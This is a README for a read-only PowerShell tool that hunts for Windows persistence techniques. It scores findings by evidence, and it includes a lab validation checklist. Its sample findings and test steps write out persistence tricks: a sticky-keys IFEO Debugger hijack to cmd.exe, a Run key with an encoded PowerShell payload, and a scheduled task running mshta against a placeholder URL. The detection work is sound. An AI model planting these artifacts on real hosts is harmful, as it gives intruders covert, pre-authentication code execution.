# `hunt_persistence.ps1` — Windows persistence hunter (MITRE ATT&CK TA0003)

Read-only Windows persistence hunter covering 42 MITRE ATT&CK TA0003 (Persistence) technique
families — Run keys, services, scheduled tasks, WMI subscriptions, Winlogon/LSA/IFEO tamper,
COM hijacking, Office trust abuse, and more (see the [module catalog](#module-catalog) below,
which mirrors `$script:ModuleCatalog` inside the script — the authoritative, current list). It
prints a full always-shown inventory of every finding grouped by module, an evidence-weighted
`ANOMALY QUEUE` of only the findings that scored `NOTABLE`/`HIGH`, and an honest `COVERAGE
REPORT` of what ran, what was skipped, and why.

- **Script:** [`hunt_persistence.ps1`](hunt_persistence.ps1) · **version:** 1.0 · **author:** Suvas Patel
- **Siblings:** same doctrine as the Linux/macOS [`hunt_persistence.sh`](<../../macOS/scripts/hunt_persistence.sh>) / [`hunt_intrusion.sh`](<../../Linux/scripts/hunt_intrusion/hunt_intrusion.sh>) tools and this repo's other `hunt_*.ps1` Windows tools ([`hunt_eventlogs.ps1`](<../event_logs/README.md>), [`hunt_recyclebin.ps1`](<../recycle_bin/README.md>), [`hunt_lnk.ps1`](<../lnk_files/README.md>)): evidence-weighted scoring, `[HIGH]`/`[NOTABLE]` tiers, "flag on evidence, enumerate everything else."

---

## Safety contract

**Strictly read-only.** This script never calls a mutating cmdlet against anything.

- **What it does:** reads the registry (`Get-Item`/`Get-ItemProperty`/`Get-ChildItem`/
  `GetValue`/the native `RegQueryInfoKey` call used only to read a key's last-write time),
  reads files and file metadata, calls `Get-AuthenticodeSignature` (a read), and queries WMI/CIM
  for host triage (OS, domain, AV/EDR product, Sysmon presence). Output goes to the console only
  (`Write-Output`/`Write-Host`/`Write-Warning`/`Write-Error`).
- **What it never does:** no `New-Item`/`Set-Item`/`Remove-Item`/`New-ItemProperty`/
  `Set-ItemProperty`/`Clear-Item` against any registry path, no file writes of any kind (no
  `Out-File`/`Export-Csv`/`Export-Clixml`/`Set-Content`/`Add-Content`), no service/process
  control, no `reg load`/`reg unload`, no network calls. There is no CSV/JSON export — a
  deliberate, permanent design decision matching the other three tools in this repo.
- **No elevation required to run.** The script detects elevation and degrades gracefully (warns,
  then lists every inaccessible target in the coverage report) rather than failing. Elevation is
  needed to read other users' registry hives, protected service configuration, and some
  LSA-related keys — anything it couldn't read for that reason lands in the coverage report,
  never silently reported as clean.
- **Single, self-contained `.ps1`.** No modules, no `Import-Module`, no external dependencies
  beyond built-in .NET/PowerShell types and in-box Win32 API calls (`advapi32.dll` via
  `Add-Type`, used only for the read-only `RegQueryInfoKey` last-write-time lookup).

---

## Module catalog

42 tokens total. Default run = every **Fast**-tier module. `-Deep` adds every **Deep**-tier
module on top. `-Modules <token[]>` overrides both defaults and runs exactly the named tokens
regardless of tier (naming a Deep-tier token this way runs it without needing `-Deep`).

### Fast tier (32 tokens)

| Token | ATT&CK ID | Detects |
|---|---|---|
| `RunKeys` | T1547.001 | Registry Run / RunOnce keys (HKLM + WOW6432Node + per-user hives + Explorer\Run policy + legacy NT\CurrentVersion\Windows Load/Run) |
| `StartupFolders` | T1547.001 | Items dropped in the all-users and per-user Startup folders |
| `ShellFolderRedir` | T1547.001 | User Shell Folders registry redirection |
| `Services` | T1543.003 | Windows services (ImagePath, start type, binary trust/signature) |
| `ServiceDll` | T1543.003 | Service DLL hijack in svchost-hosted services |
| `ScheduledTasks` | T1053.005 | Scheduled Tasks (actions, triggers, authoring account) |
| `WMI` | T1546.003 | WMI event filter/consumer/binding subscriptions |
| `Winlogon` | T1547.004 | Winlogon Shell/Userinit/Notify helper DLL tamper |
| `LSAPackages` | T1547.005 | LSA Authentication/Notification/Security Package hijack |
| `IFEO` | T1546.012 (accessibility hijack: T1546.008) | Image File Execution Options Debugger hijack, incl. accessibility-binary (sticky keys) targets and SilentProcessExit MonitorProcess |
| `AppInitCerts` | T1546.010 | AppInit_DLLs and AppCertDLLs / trust-provider certificate hijack |
| `ActiveSetup` | T1547.014 | Active Setup StubPath |
| `BootLogonScripts` | T1037.001 | Group Policy boot/logon scripts |
| `PortMonitors` | T1547.010 | Print spooler port monitor DLL hijack |
| `PrintProcessors` | T1547.012 | Print processor DLL hijack |
| `TimeProviders` | T1547.003 | W32Time time provider DLL hijack |
| `NetshHelpers` | T1546.007 | Netsh helper DLLs |
| `AppShim` | T1546.011 | Application shimming (custom SDB databases) |
| `PSProfiles` | T1546.013 | PowerShell profile scripts (all-hosts/per-host, all-users/per-user) |
| `PSModulePath` | Unmapped | `PSModulePath` environment variable hijack |
| `CommandProcessorAutoRun` | Unmapped | `cmd.exe` AutoRun registry value |
| `EnvHijack` | Unmapped | Environment variable hijack (`COR_PROFILER`, `windir`, etc.) |
| `SafeBoot` | Unmapped | SafeBoot Minimal/Network service enablement (persistence surviving into Safe Mode) |
| `TerminalServices` | Unmapped | Terminal Services InitialProgram/Shell hijack |
| `NetworkProviderOrder` | Unmapped | Network Provider Order DLL hijack |
| `BootExecute` | Unmapped | Session Manager `BootExecute` value tamper |
| `FileAssoc` | T1546.001 | Default file association hijack |
| `Screensaver` | T1546.002 | Screensaver (`.scr`) hijack |
| `OfficeTest` | T1137.002 | Office Test registry value (arbitrary DLL load at Office startup) |
| `OfficeTrustedLocations` | Unmapped | Office Trusted Locations macro-security bypass |
| `KnownDlls` | T1574.001 | `KnownDLLs` registry tampering |
| `ComWatchlist` | T1546.015 | COM hijacking — fast watchlist subset (known-abused CLSIDs) |

### Deep tier (10 tokens)

| Token | ATT&CK ID | Detects |
|---|---|---|
| `ComFull` | T1546.015 | COM hijacking — full CLSID/InprocServer32 sweep (heavier than `ComWatchlist`) |
| `FullSignaturePass` | Unmapped | Full Authenticode re-verification pass across prior findings |
| `OfficeAddins` | T1137.006 | Office add-ins (WLL/VSTO/COM) |
| `Outlook` | T1137.004 | Outlook home page / registry-visible configuration abuse |
| `SysvolGpo` | T1484.001 | SYSVOL GPO scripts/preferences tampering |
| `WinsockLsp` | Unmapped | Winsock Layered Service Provider (LSP) hijack |
| `BitsJobs` | T1197 | BITS jobs |
| `CredentialProviders` | Unmapped | Credential provider / password filter DLL |
| `BHO` | Unmapped | Browser Helper Objects (Internet Explorer, legacy) |
| `ShellExt` | Unmapped | Shell extension handlers (`shellex` CLSID) |

`Attack = 'Unmapped'` is not a placeholder to be filled in later — it's the script's own
documented convention for "no confidently-known MITRE sub-technique ID," used rather than
guessing one.

---

## Anomaly scoring

Every finding is built by `Add-Finding`, which computes a `Score` from the `Evidence` tags
present (via `$script:EvidenceWeights`) and derives a `Tier`: **`HIGH` ≥ 6**, **`NOTABLE` ≥ 3**,
else `LOW` (inventory-only, never queued). A small set of findings whose mere presence is
conclusive regardless of numeric score (e.g. an IFEO accessibility-binary Debugger hijack) are
tagged `-Absolute 'HIGH'`/`'NOTABLE'` instead of being scored — the anomaly queue marks these
with `Absolute override: True`.

| Evidence | Weight | Condition |
|---|--:|---|
| `SIG-TAMPERED` | 6 | Authenticode signature status is `HashMismatch` |
| `SIG-UNSIGNED-TRUSTED-LOCATION` | 4 | Unsigned binary sitting in an otherwise-trusted path (System32/Program Files/WinSxS) |
| `SIG-UNSIGNED-OTHER` | 2 | Unsigned binary anywhere else |
| `PATH-UNTRUSTED` | 4 | Resolved target lives in TEMP, `%LOCALAPPDATA%\Temp`, a Downloads folder, a drive root, `ProgramData` root, or a user profile root |
| `PATH-DANGLING` | 3 | Resolved target path does not exist on disk |
| `LOLBIN-ENCODED` | 4 | `-enc`/`-EncodedCommand` followed by a long base64-looking blob |
| `LOLBIN-HIDDEN` | 3 | Hidden window style stacked with `-NoProfile`/`-nop` |
| `LOLBIN-DOWNLOADER` (and any `LOLBIN-DOWNLOADER-*` sub-tag) | 4, capped at a combined 8 | `rundll32`/`regsvr32`/`mshta`/`certutil`/`bitsadmin`/`wscript`/`cscript` invoked with a URL, UNC path, or download-style argument |
| `LOLBIN-RAW-NETWORK-LITERAL` | 3 | A bare IPv4 literal or `http(s)://` URL in the command line |
| `RECENCY` | 2 | The finding's last-write time falls inside the incident window (`-Since`/`-Days`/`-Until`) — only ever produced when a window was explicitly requested |

Evidence stacks: e.g. `PATH-UNTRUSTED` (4) + `LOLBIN-ENCODED` (4) = 8 → `HIGH`. Weights and tags
are defined once in `$script:EvidenceWeights`/`Get-StandardEvidenceTags` and shared by every
module function, so scoring is consistent across all 42 technique families.

---

## Quick start

```powershell
# Default fast pass: all 32 Fast-tier modules, full inventory + anomaly queue + coverage report
.\hunt_persistence.ps1

# Full sweep: Fast + Deep tier (heavier checks: full COM sweep, Office add-ins, Outlook, SYSVOL GPO, ...)
.\hunt_persistence.ps1 -Deep

# Targeted rerun of a specific subset (Deep-tier tokens run even without -Deep when named explicitly)
.\hunt_persistence.ps1 -Modules RunKeys, Services, ScheduledTasks, WMI, ComFull

# Scope to an incident window -- enables the RECENCY evidence tag
.\hunt_persistence.ps1 -Since '2026-07-25' -MinSeverity Notable
.\hunt_persistence.ps1 -Days 3

# Inventory only, or anomaly queue only (coverage report always prints regardless)
.\hunt_persistence.ps1 -InventoryOnly
.\hunt_persistence.ps1 -AnomaliesOnly

# HIGH-tier findings only in the anomaly queue
.\hunt_persistence.ps1 -Deep -MinSeverity High
```

---

## Options

| Option | Effect |
|---|---|
| `-Modules <token[]>` | Restrict the run to specific module tokens (see the [module catalog](#module-catalog)). If omitted, the default run is every Fast-tier module, plus every Deep-tier module too if `-Deep` is also given. If `-Modules` is given explicitly, it is the exact set to run regardless of tier — naming a Deep-tier token here runs it even without `-Deep`. |
| `-Deep` | Also run Deep-tier modules (full COM hijack sweep, full Authenticode re-verification pass, Office add-ins, Outlook, SYSVOL GPO, Winsock LSP, BITS jobs, credential providers, BHOs, shell extensions) in addition to the Fast-tier default. Ignored if `-Modules` is explicitly given. |
| `-Since <datetime>` | Start of an optional incident window, e.g. `'2026-07-28'` or `'2026-07-28 09:00:00'`. Interpreted in the host's local time zone, converted to UTC internally. Wins over `-Days` if both are supplied. Leaving `-Since`/`-Days`/`-Until` all omitted leaves the window unset and `RECENCY` is never produced. |
| `-Days <int>` (default `1`) | Lookback window in days from now, used to compute the incident window start. Only takes effect if `-Since`, `-Days`, or `-Until` is explicitly supplied. |
| `-Until <datetime>` | End of the incident window. Same format/time-zone rules as `-Since`. Defaults to now when a window was requested via `-Since`/`-Days` but `-Until` itself wasn't given. |
| `-MinSeverity High\|Notable\|Low` (default `Low`) | Filters the `ANOMALY QUEUE` section only. The full inventory always shows every finding regardless of this setting. `Low` and `Notable` both surface `NOTABLE`-and-above findings (`LOW`-tier findings are inventory-only and never queued); `High` surfaces `HIGH`-tier findings only. |
| `-InventoryOnly` | Print only the full inventory section; skip the anomaly queue. Mutually exclusive with `-AnomaliesOnly`. |
| `-AnomaliesOnly` | Print only the anomaly queue section; skip the full inventory. Mutually exclusive with `-InventoryOnly`. The coverage report always prints regardless of either flag. |
| `-Help` | Print usage and exit immediately, before any other processing. |

`Get-Help .\hunt_persistence.ps1 -Full` also works — the script carries a full comment-based
help block — but `-Help` exists as a fallback since some RTR consoles don't invoke comment-based
help reliably.

---

## Reading a finding

Two shapes show up in the anomaly queue: **absolute** findings (mere presence is conclusive) and
**scored** findings (evidence stacks to a threshold). One of each:

**Absolute — IFEO accessibility-binary Debugger hijack (sticky keys):**

```
------------------------------------------------------------
[HIGH] Image File Execution Options Debugger Hijack (T1546.008)
Location   : HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
ValueName  : Debugger
RawValue   : C:\Windows\System32\cmd.exe
Target     : C:\Windows\System32\cmd.exe
PathTrust  : Trusted
Signature  : Valid (CN=Microsoft Windows, ...)
LastWrite  : 2026-07-28 03:11:02 UTC
Score      : 0  (Absolute override: True)
Evidence   : IFEO-ACCESSIBILITY-HIJACK
```

Read it as: a `Debugger` value was set under the IFEO key for `sethc.exe` (Sticky Keys, one of
the accessibility binaries invocable from the logon screen before authentication), pointing at
`cmd.exe`. The debugger binary itself is trusted and validly signed — a scored engine would miss
this — but presence of a Debugger override for one of the recognized accessibility targets
(`sethc.exe`, `utilman.exe`, `osk.exe`, `magnify.exe`, `narrator.exe`, `displayswitch.exe`) is
itself conclusive of the classic pre-auth RDP/console persistence trick, so it's forced to `HIGH`
via `-Absolute` rather than scored.

**Scored — a Run key pointing at a copy of `powershell.exe` relocated to Temp, run with an
encoded payload:**

```
------------------------------------------------------------
[HIGH] Registry Run / RunOnce Keys (T1547.001)
Location   : HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
ValueName  : Updater
RawValue   : "C:\Users\jdoe\AppData\Local\Temp\powershell.exe" -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
Target     : C:\Users\jdoe\AppData\Local\Temp\powershell.exe
PathTrust  : Untrusted
Signature  : Valid (CN=Microsoft Windows, ...)
LastWrite  : 2026-07-28 22:40:17 UTC
Score      : 8  (Absolute override: False)
Evidence   : PATH-UNTRUSTED, LOLBIN-ENCODED
```

Read it as: the resolved target is a copy of a legitimately-signed `powershell.exe` relocated to
`%LOCALAPPDATA%\Temp` — a real binary, so `Signature: Valid`, but sitting in a staging location
no installed application uses (`PATH-UNTRUSTED`, 4). The command line carries a `-enc` argument
followed by a long base64 blob (`LOLBIN-ENCODED`, 4). Stacked evidence (4 + 4 = 8) comfortably
crosses the `HIGH` threshold (≥ 6) — note that a valid signature alone never suppresses a finding;
it's one input among several, and path/behavior evidence still queues it.

---

## Coverage / tallies

Every run ends with an explicit accounting of what it *couldn't* fully process, so gaps are
visible rather than hidden:

| Section | Meaning |
|---|---|
| Modules in catalog / selected this run | Total catalog size (42) vs. how many tokens this run resolved to, given `-Modules`/`-Deep`. |
| Not yet implemented | Catalog tokens whose `FunctionName` didn't resolve via `Get-Command`. Should always be 0 — nonzero means a catalog/function-name mismatch, not a real gap, and is called out as such. |
| Skipped by `-Modules` scope | Catalog tokens excluded because `-Modules` named a different exact set. |
| Skipped, Deep-tier w/o `-Deep` | Deep-tier tokens not run because neither `-Deep` nor an explicit `-Modules` selected them. |
| Elevation | Whether the run is Administrator or not (registry/service checks needing privileged access are degraded, not failed, when not elevated). |
| Unreadable/inaccessible targets | Every registry path or file a module function couldn't read, with the reason — never silently dropped. |
| Profiles with no loaded hive | On-disk user profiles (from `ProfileList`) whose registry hive isn't currently loaded under `HKEY_USERS` — registry-backed per-user checks were skipped for them (mounting via `reg load` is explicitly out of scope, see below). |

**Not treated as an error:** a registry path or key that simply doesn't exist (e.g. no
`RunOnce` entries, no IFEO subkeys at all) — that's a clean/empty result, not a gap, and is never
tallied alongside genuine access failures.

---

## Out of scope

Pulled directly from the script's own `.DESCRIPTION`/`OUT OF SCOPE` block — deliberate design
decisions, not oversights:

- **Offline/non-loaded registry hive scanning via `reg load`.** Mounting another user's hive
  this way is itself a *write* to the registry (it creates a live key) and risks leaving a hive
  mounted/orphaned if an RTR session drops mid-script, which can break that user's profile.
  Per-user checks are limited to hives already loaded (`HKEY_USERS`) — see the "profiles with no
  loaded hive" coverage section above.
- **WSL-internal persistence** (cron, systemd units, shell rc files inside a WSL distro
  filesystem). Out of scope for a Windows registry/filesystem persistence hunter.
- **Kernel/driver rootkit-hook detection** (SSDT/IDT hooks, inline hooks, etc.). Needs
  kernel-mode tooling this script deliberately does not attempt to be.
- **UEFI/firmware persistence** (bootkits, SPI flash implants). Outside the reach of anything
  queryable from within a running OS via PowerShell.
- **Outlook Rules.** Stored inside the mailbox (server-side or `.ost`/`.pst`), not in the
  registry or a filesystem location this tool enumerates.
- **Office macro *content* analysis** (VBA project decompilation/scanning). This tool looks at
  Office *trust configuration* (Trusted Locations, Office Test) as persistence surface, not macro
  payload content.
- **Generic filesystem DLL search-order-hijack scanning.** No fixed, enumerable
  registry/filesystem location for this technique family — it requires walking arbitrary
  application install directories, a different tool's job. See this repo's
  `Windows/10 - Persistence Mechanisms/DLL Hijacking.md` for the manual/targeted methodology.

---

## Validation checklist

Run these on a disposable/lab VM (never on a production host) and remove every planted artifact
afterward:

1. **Basic Run key detection.** Add a benign value under
   `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` pointing at a signed binary in
   `Program Files`. Confirm it appears in the full inventory under "Registry Run / RunOnce Keys"
   with `PathTrust: Trusted` and no evidence tags (LOW tier, inventory-only).
2. **`PATH-UNTRUSTED` + `LOLBIN-ENCODED` (Run key).** Add a Run value invoking
   `powershell.exe -enc <40+ char base64 blob>` with a resolved target under
   `%LOCALAPPDATA%\Temp`. Confirm both tags fire, score sums to 8, and the finding is queued
   `HIGH`.
3. **`IFEO-ACCESSIBILITY-HIJACK` (absolute HIGH).** Under
   `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`,
   set a `Debugger` value to any binary (e.g. `cmd.exe`). Confirm it's forced to `HIGH` with
   `Absolute override: True` and `Evidence: IFEO-ACCESSIBILITY-HIJACK`, regardless of the
   debugger binary's own trust/signature status.
4. **`PATH-DANGLING`.** Point a Run key or service `ImagePath` at a file path that does not
   exist. Confirm `PATH-DANGLING` (3) fires and the finding's `PathTrust` reads `DoesNotExist`.
5. **Scheduled task detection.** Create a scheduled task whose action runs
   `mshta.exe http://<test-domain>/a.hta`. Confirm it's picked up by the `ScheduledTasks` module
   and both `LOLBIN-DOWNLOADER` and `LOLBIN-RAW-NETWORK-LITERAL` fire.
6. **`RECENCY` modifier.** Plant any of the above artifacts, then run with `-Days 1` (or
   `-Since` covering today). Confirm `RECENCY` (2) appears in the evidence list and contributes
   to the score; re-run with no timeframe flags and confirm `RECENCY` never appears.
7. **Graceful degradation.** Run once elevated and once not. Confirm the non-elevated run still
   completes, still produces the full inventory/anomaly queue for everything it *could* read, and
   lists every inaccessible registry path/service and every profile with no loaded hive in the
   coverage report — never silently reported as clean.
8. **Deep-tier gating.** Run with no flags and confirm all 10 Deep-tier tokens appear under
   "Skipped, Deep-tier w/o -Deep" in the coverage report. Re-run with `-Deep` and confirm they
   execute. Re-run with `-Modules ComFull` alone (no `-Deep`) and confirm that one Deep-tier
   token still executes, since explicit `-Modules` overrides tier gating.
9. **`-Help`.** Run `-Help` and confirm it prints usage and returns immediately, before any
   registry/file access happens.

---

## Changelog

- **v1.0** — Initial professional build, written in sequential passes (Pass A: scaffolding,
  shared helpers, the evidence-weighted scoring engine, and rendering; Pass B: 10
  structurally-nontrivial core modules; Pass C: 21 further Fast-tier modules; Pass D: 10 Deep-tier
  modules plus final dispatch wiring). All 42 `$script:ModuleCatalog` tokens resolve to a real
  function. Evidence-weighted scoring (`SIG-TAMPERED`, `SIG-UNSIGNED-*`, `PATH-UNTRUSTED`,
  `PATH-DANGLING`, `LOLBIN-ENCODED`, `LOLBIN-HIDDEN`, `LOLBIN-DOWNLOADER*`,
  `LOLBIN-RAW-NETWORK-LITERAL`, `RECENCY`) with `HIGH`/`NOTABLE`/`LOW` tiers, plus a small set of
  `-Absolute`-tier findings (e.g. IFEO accessibility-binary hijack) where presence alone is
  conclusive. Full always-shown inventory, a `-MinSeverity`-filterable anomaly queue, and an
  honest coverage report (modules run/skipped and why, unreadable registry/file targets, on-disk
  profiles with no loaded hive, elevation status). Read-only, console-only, no CSV/JSON export by
  design; no elevation required, degrades gracefully.
